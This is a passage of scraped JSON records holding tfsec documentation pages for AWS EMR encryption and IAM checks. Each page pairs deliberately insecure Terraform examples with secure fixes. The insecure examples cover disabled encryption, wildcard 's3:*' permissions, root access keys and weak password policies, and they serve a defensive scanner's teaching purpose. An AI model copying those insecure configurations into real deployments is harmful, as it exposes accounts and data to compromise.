\"good_example\" {\n    name = \"emrsc_other\"\n  \n    configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n  }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html](https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:15.455594"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/emr/enable-local-disk-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/emr/enable-local-disk-encryption/index.md", "content": "---\ntitle: Enable local-disk encryption for EMR clusters.\n---\n\n# Enable local-disk encryption for EMR clusters.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nData stored within an EMR instances should be encrypted to ensure sensitive data is kept private.\n\n### Possible Impact\nLocal-disk data in the EMR cluster could be compromised if accessed.\n\n### Suggested Resolution\nEnable local-disk encryption for EMR cluster\n\n\n### Insecure Example\n\nThe following example will fail the aws-emr-enable-local-disk-encryption check.\n```terraform\n\n  resource \"aws_emr_security_configuration\" \"bad_example\" {\n    name = \"emrsc_other\"\n    \n    configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"\",\n          \"AwsKmsKey\": \"\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n  }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-emr-enable-local-disk-encryption check.\n```terraform\n\n  resource \"aws_emr_security_configuration\" \"good_example\" {\n    name = \"emrsc_other\"\n  \n    configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n  }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html](https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:15.759794"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/emr/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/emr/index.md", "content": "---\ntitle: emr\n---\n\n# emr\n\n## Checks\n\n\n- [enable-at-rest-encryption](enable-at-rest-encryption) Enable at-rest encryption for EMR clusters.\n\n- [enable-in-transit-encryption](enable-in-transit-encryption) Enable in-transit encryption for EMR clusters.\n\n- [enable-local-disk-encryption](enable-local-disk-encryption) Enable local-disk encryption for EMR clusters.\n\n\n\n", "timestamp": "2025-10-24T22:24:15.867882"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/enforce-group-mfa/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/enforce-group-mfa/index.md", "content": "---\ntitle: IAM groups should have MFA enforcement activated.\n---\n\n# IAM groups should have MFA enforcement activated.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\n\nIAM groups should be protected with multi factor authentication to add safe guards to password compromise.\n\t\t\t\n\n### Possible Impact\nIAM groups are more vulnerable to compromise without multi factor authentication activated\n\n### Suggested Resolution\nUse terraform-module/enforce-mfa/aws to ensure that MFA is enforced\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-enforce-group-mfa check.\n```terraform\n\ndata aws_caller_identity current {}\nresource aws_iam_group developers {\n  name =  \"developers\"\n}\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-enforce-group-mfa check.\n```terraform\n\nresource \"aws_iam_group\" \"support\" {\n  name =  \"support\"\n}\nresource aws_iam_group_policy mfa {\n   \n    group = aws_iam_group.support.name\n    policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"ec2:*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n          \"Bool\": {\n              \"aws:MultiFactorAuthPresent\": [\"true\"]\n          }\n      }\n    }\n  ]\n}\nEOF\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest](https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:16.302153"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/enforce-mfa/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/enforce-mfa/index.md", "content": "---\ntitle: IAM Groups should have MFA enforcement activated.\n---\n\n# IAM Groups should have MFA enforcement activated.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\n\nIAM user accounts should be protected with multi factor authentication to add safe guards to password compromise.\n\t\t\t\n\n### Possible Impact\nUser accounts are more vulnerable to compromise without multi factor authentication activated\n\n### Suggested Resolution\nUse terraform-module/enforce-mfa/aws to ensure that MFA is enforced\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-enforce-mfa check.\n```terraform\n\ndata aws_caller_identity current {}\nresource aws_iam_group developers {\n  name =  \"developers\"\n}\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-enforce-mfa check.\n```terraform\n\nresource \"aws_iam_group\" \"support\" {\n  name =  \"support\"\n}\nresource aws_iam_group_policy mfa {\n   \n    group = aws_iam_group.support.name\n    policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"ec2:*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n          \"Bool\": {\n              \"aws:MultiFactorAuthPresent\": [\"true\"]\n          }\n      }\n    }\n  ]\n}\nEOF\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest](https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:16.575418"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/index.md", "content": "---\ntitle: iam\n---\n\n# iam\n\n## Checks\n\n\n- [enforce-group-mfa](enforce-group-mfa) IAM groups should have MFA enforcement activated.\n\n- [no-password-reuse](no-password-reuse) IAM Password policy should prevent password reuse.\n\n- [no-policy-wildcards](no-policy-wildcards) IAM policy should avoid use of wildcards and instead apply the principle of least privilege\n\n- [no-root-access-keys](no-root-access-keys) The root user has complete access to all services and resources in an AWS account. AWS Access Keys provide programmatic access to a given account.\n\n- [no-user-attached-policies](no-user-attached-policies) IAM policies should not be granted directly to users.\n\n- [require-lowercase-in-passwords](require-lowercase-in-passwords) IAM Password policy should have requirement for at least one lowercase character.\n\n- [require-numbers-in-passwords](require-numbers-in-passwords) IAM Password policy should have requirement for at least one number in the password.\n\n- [require-symbols-in-passwords](require-symbols-in-passwords) IAM Password policy should have requirement for at least one symbol in the password.\n\n- [require-uppercase-in-passwords](require-uppercase-in-passwords) IAM Password policy should have requirement for at least one uppercase character.\n\n- [set-max-password-age](set-max-password-age) IAM Password policy should have expiry less than or equal to 90 days.\n\n- [set-minimum-password-length](set-minimum-password-length) IAM Password policy should have minimum password length of 14 or more characters.\n\n\n\n", "timestamp": "2025-10-24T22:24:16.692017"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/no-password-reuse/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/no-password-reuse/index.md", "content": "---\ntitle: IAM Password policy should prevent password reuse.\n---\n\n# IAM Password policy should prevent password reuse.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nIAM account password policies should prevent the reuse of passwords. \n\nThe account password policy should be set to prevent using any of the last five used passwords.\n\n### Possible Impact\nPassword reuse increase the risk of compromised passwords being abused\n\n### Suggested Resolution\nPrevent password reuse in the policy\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-no-password-reuse check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"bad_example\" {\n \t# ...\n \tpassword_reuse_prevention = 1\n \t# ...\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-no-password-reuse check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"good_example\" {\n \t# ...\n \tpassword_reuse_prevention = 5\n \t# ...\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:16.978509"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/no-policy-wildcards/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/no-policy-wildcards/index.md", "content": "---\ntitle: IAM policy should avoid use of wildcards and instead apply the principle of least privilege\n---\n\n# IAM policy should avoid use of wildcards and instead apply the principle of least privilege\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should use the principle of least privilege when defining your IAM policies. This means you should specify each exact permission required without using wildcards, as this could cause the granting of access to certain undesired actions, resources and principals.\n\n### Possible Impact\nOverly permissive policies may grant access to sensitive resources\n\n### Suggested Resolution\nSpecify the exact permissions required, and to which resources they should apply instead of using wildcards.\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-no-policy-wildcards check.\n```terraform\n\n resource \"aws_iam_role_policy\" \"test_policy\" {\n \tname = \"test_policy\"\n \trole = aws_iam_role.test_role.id\n \n \tpolicy = data.aws_iam_policy_document.s3_policy.json\n }\n \n resource \"aws_iam_role\" \"test_role\" {\n \tname = \"test_role\"\n \tassume_role_policy = jsonencode({\n \t\tVersion = \"2012-10-17\"\n \t\tStatement = [\n \t\t{\n \t\t\tAction = \"sts:AssumeRole\"\n \t\t\tEffect = \"Allow\"\n \t\t\tSid    = \"\"\n \t\t\tPrincipal = {\n \t\t\tService = \"s3.amazonaws.com\"\n \t\t\t}\n \t\t},\n \t\t]\n \t})\n }\n \n data \"aws_iam_policy_document\" \"s3_policy\" {\n   statement {\n     principals {\n       type        = \"AWS\"\n       identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n     }\n     actions   = [\"s3:*\"]\n     resources = [\"*\"]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-no-policy-wildcards check.\n```terraform\n\n resource \"aws_iam_role_policy\" \"test_policy\" {\n \tname = \"test_policy\"\n \trole = aws_iam_role.test_role.id\n \n \tpolicy = data.aws_iam_policy_document.s3_policy.json\n }\n \n resource \"aws_iam_role\" \"test_role\" {\n \tname = \"test_role\"\n \tassume_role_policy = jsonencode({\n \t\tVersion = \"2012-10-17\"\n \t\tStatement = [\n \t\t{\n \t\t\tAction = \"sts:AssumeRole\"\n \t\t\tEffect = \"Allow\"\n \t\t\tSid    = \"\"\n \t\t\tPrincipal = {\n \t\t\tService = \"s3.amazonaws.com\"\n \t\t\t}\n \t\t},\n \t\t]\n \t})\n }\n \n data \"aws_iam_policy_document\" \"s3_policy\" {\n   statement {\n     principals {\n       type        = \"AWS\"\n       identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n     }\n     actions   = [\"s3:GetObject\"]\n     resources = [aws_s3_bucket.example.arn]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/data-sources/iam_policy_document](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/data-sources/iam_policy_document){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:17.240758"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/no-root-access-keys/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/no-root-access-keys/index.md", "content": "---\ntitle: The root user has complete access to all services and resources in an AWS account. AWS Access Keys provide programmatic access to a given account.\n---\n\n# The root user has complete access to all services and resources in an AWS account. AWS Access Keys provide programmatic access to a given account.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\n\nCIS recommends that all access keys be associated with the root user be removed. Removing access keys associated with the root user limits vectors that the account can be compromised by. Removing the root user access keys also encourages the creation and use of role-based accounts that are least privileged.\n\t\t\t\n\n### Possible Impact\nCompromise of the root account compromises the entire AWS account and all resources within it.\n\n### Suggested Resolution\nUse lower privileged accounts instead, so only required privileges are available.\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-no-root-access-keys check.\n```terraform\n\nresource \"aws_iam_access_key\" \"good_example\" {\n \tuser = \"root\"\n}\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-no-root-access-keys check.\n```terraform\n\nresource \"aws_iam_access_key\" \"good_example\" {\n \tuser = \"lowprivuser\"\n}\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_access_key](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_access_key){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:17.524651"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/no-user-attached-policies/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/no-user-attached-policies/index.md", "content": "---\ntitle: IAM policies should not be granted directly to users.\n---\n\n# IAM policies should not be granted directly to users.\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\n\nCIS recommends that you apply IAM policies directly to groups and roles but not users. Assigning privileges at the group or role level reduces the complexity of access management as the number of users grow. Reducing access management complexity might in turn reduce opportunity for a principal to inadvertently receive or retain excessive privileges.\n\t\t\t\n\n### Possible Impact\nComplex access control is difficult to manage and maintain.\n\n### Suggested Resolution\nGrant policies at the group level instead.\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-no-user-attached-policies check.\n```terraform\n\nresource \"aws_iam_user\" \"jim\" {\n  name = \"jim\"\n}\n\nresource \"aws_iam_user_policy\" \"ec2policy\" {\n  name = \"test\"\n  user = aws_iam_user.jim.name\n\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-no-user-attached-policies check.\n```terraform\n\nresource \"aws_iam_group\" \"developers\" {\n  name = \"developers\"\n  path = \"/users/\"\n}\n\nresource \"aws_iam_user\" \"jim\" {\n  name = \"jim\"\n}\n\nresource \"aws_iam_group_membership\" \"devteam\" {\n  name = \"developers-team\"\n\n  users = [\n    aws_iam_user.jim.name,\n  ]\n\n  group = aws_iam_group.developers.name\n}\n\nresource \"aws_iam_group_policy\" \"ec2policy\" {\n  name = \"test\"\n  group = aws_iam_group.developers.name\n\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_user](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_user){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://console.aws.amazon.com/iam/](https://console.aws.amazon.com/iam/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:17.814077"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/require-lowercase-in-passwords/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/require-lowercase-in-passwords/index.md", "content": "---\ntitle: IAM Password policy should have requirement for at least one lowercase character.\n---\n\n# IAM Password policy should have requirement for at least one lowercase character.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nIAM account password policies should ensure that passwords content including at least one lowercase character.\n\n### Possible Impact\nShort, simple passwords are easier to compromise\n\n### Suggested Resolution\nEnforce longer, more complex passwords in the policy\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-require-lowercase-in-passwords check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"bad_example\" {\n \t# ...\n \t# require_lowercase_characters not set\n \t# ...\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-require-lowercase-in-passwords check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"good_example\" {\n \t# ...\n \trequire_lowercase_characters = true\n \t# ...\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:18.071609"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/require-numbers-in-passwords/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/require-numbers-in-passwords/index.md", "content": "---\ntitle: IAM Password policy should have requirement for at least one number in the password.\n---\n\n# IAM Password policy should have requirement for at least one number in the password.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nIAM account password policies should ensure that passwords content including at least one number.\n\n### Possible Impact\nShort, simple passwords are easier to compromise\n\n### Suggested Resolution\nEnforce longer, more complex passwords in the policy\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-require-numbers-in-passwords check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"bad_example\" {\n \t# ...\n \t# require_numbers not set\n \t# ...\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-require-numbers-in-passwords check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"good_example\" {\n \t# ...\n \trequire_numbers = true\n \t# ...\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:18.347667"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/require-symbols-in-passwords/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/require-symbols-in-passwords/index.md", "content": "---\ntitle: IAM Password policy should have requirement for at least one symbol in the password.\n---\n\n# IAM Password policy should have requirement for at least one symbol in the password.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nIAM account password policies should ensure that passwords content including a symbol.\n\n### Possible Impact\nShort, simple passwords are easier to compromise\n\n### Suggested Resolution\nEnforce longer, more complex passwords in the policy\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-require-symbols-in-passwords check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"bad_example\" {\n \t# ...\n \t# require_symbols not set\n \t# ...\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-require-symbols-in-passwords check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"good_example\" {\n \t# ...\n \trequire_symbols = true\n \t# ...\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:18.650050"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/require-uppercase-in-passwords/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/require-uppercase-in-passwords/index.md", "content": "---\ntitle: IAM Password policy should have requirement for at least one uppercase character.\n---\n\n# IAM Password policy should have requirement for at least one uppercase character.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\n,\nIAM account password policies should ensure that passwords content including at least one uppercase character.\n\n### Possible Impact\nShort, simple passwords are easier to compromise\n\n### Suggested Resolution\nEnforce longer, more complex passwords in the policy\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-require-uppercase-in-passwords check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"bad_example\" {\n \t# ...\n \t# require_uppercase_characters not set\n \t# ...\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-require-uppercase-in-passwords check.\n```terraform\n\n resource \"aws_iam_account_password_policy\" \"good_example\" {\n \t# ...\n \trequire_uppercase_characters = true\n \t# ...\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:18.939012"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/set-max-password-age/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/set-max-password-age/index.md", "content": "---\ntitle: IAM Password policy should have expiry less than or equal to 90 days.\n---\n\n# IAM Password policy should have expiry less than or equal to 90 days.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nIAM account password policies should have a maximum age specified. \n\t\t\nThe account password policy should be set to expire passwords after 90 days or less.\n\n### Possible Impact\nLong life password increase the likelihood of a password eventually being compromised\n\n### Suggested Resolution\nLimit the password duration with an expiry in the policy\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-set-max-password-age check.\n```terraform\n\nresource \"aws_iam_account_password_policy\" \"bad_example\" {\n\t# ...\n\t# max_password_age not set\n\t# ...\n}\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-set-max-password-age check.\n```terraform\n\nresource \"aws_iam_account_password_policy\" \"good_example\" {\n\tmax_password_age = 90\n}\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:19.223882"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/iam/set-minimum-password-length/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/iam/set-minimum-password-length/index.md", "content": "---\ntitle: IAM Password policy should have minimum password length of 14 or more characters.\n---\n\n# IAM Password policy should have minimum password length of 14 or more characters.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nIAM account password policies should ensure that passwords have a minimum length. \n\nThe account password policy should be set to enforce minimum password length of at least 14 characters.\n\n### Possible Impact\nShort, simple passwords are easier to compromise\n\n### Suggested Resolution\nEnforce longer, more complex passwords in the policy\n\n\n### Insecure Example\n\nThe following example will fail the aws-iam-set-minimum-password-length check.\n```terraform\n\nresource \"aws_iam_account_password_policy\" \"bad_example\" {\n\t# ...\n\t# minimum_password_length not set\n\t# ...\n}\n\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-iam-set-minimum-password-length check.\n```terraform\n\nresource \"aws_iam_account_password_policy\" \"good_example\" {\n\tminimum_password_length = 14\n}\n\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:19.540532"}
